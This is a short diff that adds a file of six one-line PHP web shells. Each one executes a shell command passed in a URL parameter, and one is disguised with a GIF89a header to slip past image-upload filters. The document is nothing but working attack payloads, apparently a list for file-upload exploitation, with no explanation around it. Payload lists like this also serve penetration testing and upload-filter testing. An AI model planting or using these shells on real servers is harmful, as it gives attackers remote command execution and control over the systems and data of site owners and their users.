@@ -1,0 +1,6 @@
+<?php system($_GET['c']); ?>
+<?=`$_GET[cmd]`;?>
+GIF89a<?php system($_GET['c']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+<?php exec($_GET['cmd'], $output); ?>
